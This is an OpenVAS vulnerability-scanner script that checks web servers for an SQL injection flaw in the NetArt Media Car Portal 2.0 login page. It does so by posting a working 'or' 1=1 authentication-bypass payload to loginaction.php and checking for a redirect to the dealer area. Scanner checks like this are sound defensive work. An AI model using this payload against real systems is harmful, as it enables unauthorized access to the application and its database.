##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_nam_carportal_sql_inj_vuln.nasl 7276 2017-09-26 11:59:52Z cfischer $
#
# NetArt Media Car Portal SQL injection Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902475");
  script_version("$Revision: 7276 $");
  script_tag(name:"last_modification", value:"$Date: 2017-09-26 13:59:52 +0200 (Tue, 26 Sep 2017) $");
  script_tag(name:"creation_date", value:"2011-09-23 16:39:49 +0200 (Fri, 23 Sep 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("NetArt Media Car Portal SQL injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://securityreason.com/wlb_show/WLB-2011090081");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/105210/carportal20-sqlbypass.txt");

  script_tag(name:"insight", value:"The flaw exists due to the error in 'loginaction.php', which
  fails to sufficiently sanitize user-supplied data in 'Email' and 'Password'
  parameters.");
  script_tag(name:"solution", value:"No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running NetArt Media Car Portal and is prone SQL
  injection vulnerability.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to bypass the
  security restrictions or view, add, modify back-end database.

  Impact Level: Application");
  script_tag(name:"affected", value:"NetArt Media Car Portal Version 2.0");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

## Check host supports PHP
if( ! can_host_php( port:port ) ) exit( 0 );

host = http_host_name( port:port );

## Iterate over the possible paths
foreach dir( make_list_unique( "/autoportal1", "/carportal", "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  ## Send and receive the data
  rcvRes = http_get_cache( item:dir + "/index.php", port:port );

  ## Confirm the application
  if( '">Car Portal<' >< rcvRes && 'netartmedia' >< rcvRes ) {

    filename = dir + "/loginaction.php";
    authVariables ="Email=%27or%27+1%3D1&Password=%27or%27+1%3D1";

    ## Construct post request
    sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n",
                    "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                    authVariables);
    rcvRes = http_keepalive_send_recv( port:port, data:sndReq );

    ## Check the Response and confirm the exploit
    if( "Location: DEALERS/index.php" >< rcvRes ) {
      report = report_vuln_url( port:port, url:filename );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
